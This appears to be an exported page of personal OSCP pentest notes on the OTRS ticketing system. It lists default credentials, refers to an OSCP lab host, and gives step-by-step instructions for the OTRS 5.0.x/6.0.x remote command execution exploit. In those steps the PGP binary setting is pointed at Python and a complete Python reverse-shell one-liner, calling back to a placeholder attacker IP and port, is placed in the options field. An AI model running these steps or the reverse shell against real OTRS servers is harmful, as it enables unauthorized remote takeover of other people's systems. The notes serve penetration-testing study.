<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>OTRS</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># OTRS</h1></strong><br /><a href="https://otrs.com/product-otrs/">https://otrs.com/product-otrs/</a><br /><br />According to their website,<br />&quot;OTRS is a modern, flexible ticket and process management system that allows service management professionals in any industry to keep pace with today’s lightning-fast, results-driven business environment.&quot;<br /><br /><strong>Examples</strong><br />• oscp 10.11.1.39 - leftturn.thinc<br /><br /><strong><h2>## Default Credentials</h2></strong><br />• <a href="http://open-sez.me/passwd-otrs.htm">http://open-sez.me/passwd-otrs.htm</a><br />• <a href="https://vulners.com/openvas/OPENVAS:1361412562310108465">https://vulners.com/openvas/OPENVAS:1361412562310108465</a><br /><br /><code>root@localhost / root</code><br />Docker container - <code>Root@localhost / root</code><br /><br />Try <code>cewl</code> to generate a wordlist (used in OSCP 10.11.1.39)<br /><br /><strong><h2>## Exploits</h2></strong><br /><strong><h3>### OTRS 5.0.x/6.0.x - Remote Command Execution</h3></strong><br /><a href="https://www.exploit-db.com/exploits/43853">https://www.exploit-db.com/exploits/43853</a><br /><br /><strong>Examples</strong><br />• oscp 10.11.1.39 - leftturn.thinc<br /><br />1. Log in as an agent account - <code>&lt;path&gt;/index.pl</code><br />2. Open &quot;Admin&quot; tab. - <code>&lt;path&gt;/index.pl?Action=Admin</code><br />3. Open &quot;SysConfig&quot; settings. - <code>&lt;path&gt;/index.pl?Action=AdminSysConfig</code><br />4. Find the &quot;Crypt:PGP&quot; subgroup. - <code>&lt;path&gt;/index.pl?Action=AdminSysConfig;Subaction=Edit;SysConfigSubGroup=Crypt%3A%3APGP;SysConfigGroup=Framework</code><br />5. Manipulate form parameters and use <code>Update</code> button to save<br /><br />&quot;PGP&quot;<br />-Default: <code>No</code><br />-Modify to: <code>Yes</code><br /><br />&quot;PGP::Bin&quot;<br />-Default: <code>/usr/bin/gpg </code><br />-Modify to: <code>&lt;a binary the webserver user has execute permissions for, no options&gt;</code><br />-Modify to PoC (Reverse Python Shell): <code>/usr/bin/python</code><br /><br />&quot;PGP::Options&quot;<br />-Default: <code>--homedir /opt/otrs/.gnupg/ --batch --no-tty --yes</code><br />-Modify to: <code>&lt;any command options&gt;</code><br />-Modify to PoC (Reverse Python Shell): <code>-c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;YOURIP&gt;&quot;,&lt;YOURLISTENINGPORT&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code><br /><br />6. Open &quot;Admin&quot; tab. - <code>&lt;path&gt;/index.pl?Action=Admin</code><br />7. Open &quot;PGP Keys&quot; to execute saved command. - <code>&lt;path&gt;/index.pl?Action=AdminPGP</code></div>
</body>
</html>
